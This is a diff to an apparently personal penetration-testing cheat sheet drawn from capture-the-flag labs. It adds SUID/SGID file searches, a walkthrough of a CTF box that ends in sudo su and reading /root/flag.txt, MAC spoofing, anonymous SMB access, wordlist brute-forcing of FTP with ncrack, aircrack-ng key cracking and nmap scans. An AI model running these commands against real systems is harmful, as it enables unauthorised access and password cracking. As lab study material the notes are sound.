@@ -198,6 +198,7 @@ python -c print "A" * 512 | nc localhost 3333
 ######Find all setuserid programs
 find / -perm +6000 -type f 2>/dev/null
 find / -perm -4000 -user root 2>/dev/null
+find / -perm -2000 -type f 2>/dev/null
 sudo find / -perm -2 ! -type l -ls #file that can be written to
 > file redirects stdout to file
 1> file redirects stdout to file
@@ -213,6 +214,7 @@ ps aux > /tmp/ps2
 diff ps1 ps2
 ftp>!/bash/bash
 upload file to server with ^  ^
+
 
 find -perm +6000 -type f 2>/dev/null
                            (@  @) 
@@ -719,4 +721,59 @@ __________compile 32 on 64
 gcc -m32 overlay.c -o overlay 
 
 
+___Mitmproxy with curl
+mitmproxy --socks -p 8881
+Acid curl --socks5 127.0.0.1:8881 192.168.0.105:33447
+fire up man in the middle proxy
+watch for command execution
+ie: 
+find / -name *pcap*
+look for tcp stream
+found saman
+1337hax0r
+cd /home/saman
+history
+sudo -l
+sudo su
+cat /root/flag.txt
 
+
+Dear Hax0r,
+You have successfully completed the challenge.
+I  hope you like it.
+FLAG NAME: "Acid@Makke@Hax0r"
+Kind & Best Regards
+-ACID
+facebook: https://facebook.com/m.avinash143
+
+_____________________ip <network up/down>
+
+ip link show eth0 
+sudo ip link set dev eth0 down
+sudo ip link set dev eth0 up
+
+
+__________spoof mac
+++vendor and byte
+macchanger -r eth0
+++no vendor
+macchanger -e eth0
+
+
+_____Samba
+smbclient //BBox/EricsSecretStuff -u anonymous
+ls
+get ebd.txt
+
+
+_______________MAKE A wordlist
+cat /root/rockyou.txt | grep veronica > veronica.txt
+
+ncrack -y veronica -P veronica.txt -T5 BBox -p 21
+aircrack-ng eg-01.cap -w /$WORDLISTS/rockyou.txt
+erics backdoor
+triscuit*
+___Nmap udp tcp Hammer time
+necro sudo nmap nmap -sU -sT -n -r -T4 necro -p-  
+
+tcpdump -i eth0 -vv | tee -a dump.txt
